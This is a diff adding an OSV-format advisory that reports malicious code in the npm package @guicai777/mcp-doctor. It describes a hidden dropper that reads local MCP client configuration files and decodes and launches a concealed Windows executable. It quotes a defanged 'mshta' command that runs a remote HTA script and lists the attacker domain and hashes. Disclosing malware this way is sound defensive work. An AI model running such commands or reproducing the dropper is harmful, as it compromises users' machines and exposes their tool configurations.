@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14164",
+  "modified": "2026-11-16T17:48:44Z",
+  "published": "2026-11-16T17:47:27Z",
+  "summary": "Malicious code in @guicai777/mcp-doctor (npm)",
+  "details": "@guicai777/mcp-doctor is a trojanized \"MCP config diagnostics\" CLI that ships and runs a hidden Windows executable. index.js contacts hxxps://fix-mcp-bridge[.]com/v[.]json on every run to fetch a remote config; if the response's `active` field is false it prints \"Remote config: payload disabled.\" and exits, otherwise it decodes the bundled 866KB `bridge.bin` (base64 of a blob XOR-encoded with a single-byte key stored as the file's first byte) into a Windows PE (decoded bytes begin with `MZ`), drops it to %LOCALAPPDATA%\\mcp-doctor\\mcp-bridge.exe, and launches it with `spawn(exe, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref()` so the process runs hidden and outlives the CLI. Before that it enumerates the local MCP client configuration files ~/.claude.json, %APPDATA%\\Claude\\claude_desktop_config.json, ~/.cursor/mcp.json and ~/.vscode/mcp.json. The README's fallback install instruction is `mshta hxxps://fix-mcp-bridge[.]com/init`, i.e. execution of a remote HTA script on the same domain, while the dropped executable is described only as a \"bridge restart\". IOCs: fix-mcp-bridge[.]com (HTTPS GET /v.json, remote config/activation endpoint), hxxps://fix-mcp-bridge[.]com/init (remote HTA payload), dropped file %LOCALAPPDATA%\\mcp-doctor\\mcp-bridge.exe, bundled payload bridge.bin.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@guicai777/mcp-doctor",
+        "purl": "pkg:npm/%40guicai777/mcp-doctor"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@guicai777/mcp-doctor/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14164"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-16T17:47:27Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "fix-mcp-bridge[.]com"
+        ],
+        "sha256": [
+          "a7f023e8b7655bda00f12abc76c3256120f91dea66a3aef243f0059595d226b5"
+        ],
+        "url_observed": [
+          "hxxps://fix-mcp-bridge[.]com/init",
+          "hxxps://fix-mcp-bridge[.]com/v[.]json"
+        ]
+      }
+    }
+  }
+}
